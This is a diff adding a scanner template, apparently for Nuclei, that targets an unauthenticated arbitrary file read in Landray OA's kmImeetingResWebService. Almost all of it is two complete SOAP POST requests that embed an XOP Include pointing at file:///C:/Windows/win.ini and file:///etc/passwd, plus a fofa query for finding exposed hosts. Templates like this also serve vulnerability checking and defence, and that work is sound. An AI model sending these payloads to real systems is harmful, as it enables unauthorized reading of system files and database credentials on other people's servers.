@@ -1,0 +1,89 @@
+id: Landray-WebService-kmImeetingResWebService-File-reading
+
+info:
+  name: "蓝凌OA kmImeetingResWebService 组件任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Com_Parameter"
+      蓝凌OA系统kmImeetingResWebService WebService接口存在文件访问控制缺陷，攻击者可利用此漏洞在未认证状态下访问敏感文件（包括数据库连接配置文件、系统参数文件等），可能导致系统面临严重安全风险。该漏洞允许通过构造特定请求路径实现对非授权资源的读取操作，可能造成敏感信息泄露和系统权限突破。
+  reference:
+  - https://mp.weixin.qq.com/s/tD-4JU_2k8_2-dY_W9zvkg?token=1066715859&lang=zh_CN
+  tags: 蓝凌OA
+
+
+http:
+- raw:
+  - |
+    POST /sys/webservice/kmImeetingResWebService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+    Connection: close
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+    SOAPAction: ""
+    Accept-Encoding: gzip, deflate
+
+    ------4upt9dwdca8rtwq9osuz
+    Content-Disposition: form-data; name="a"
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
+    <soapenv:Header/>
+    <soapenv:Body>
+        <web:getKmimeetingResById>
+            <arg0>
+                <beginTimeStamp>a</beginTimeStamp>
+                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+            </arg0>
+        </web:getKmimeetingResById>
+    </soapenv:Body>
+    </soapenv:Envelope>
+    ------4upt9dwdca8rtwq9osuz--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
+    - 'Unmarshalling Error: 意外的文本'
+    condition: and
+  - type: status
+    status:
+    - 500
+- raw:
+  - |
+    POST /sys/webservice/kmImeetingResWebService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+    Connection: close
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+    SOAPAction: ""
+    Accept-Encoding: gzip, deflate
+
+    ------4upt9dwdca8rtwq9osuz
+    Content-Disposition: form-data; name="a"
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
+    <soapenv:Header/>
+    <soapenv:Body>
+        <web:getKmimeetingResById>
+            <arg0>
+                <beginTimeStamp>a</beginTimeStamp>
+                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
+            </arg0>
+        </web:getKmimeetingResById>
+    </soapenv:Body>
+    </soapenv:Envelope>
+    ------4upt9dwdca8rtwq9osuz--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'cm9vdDov'
+    - 'L2Jpbi9iYXNo'
+    - 'Unmarshalling Error: 意外的文本'
+    condition: and
+  - type: status
+    status:
+    - 500
+
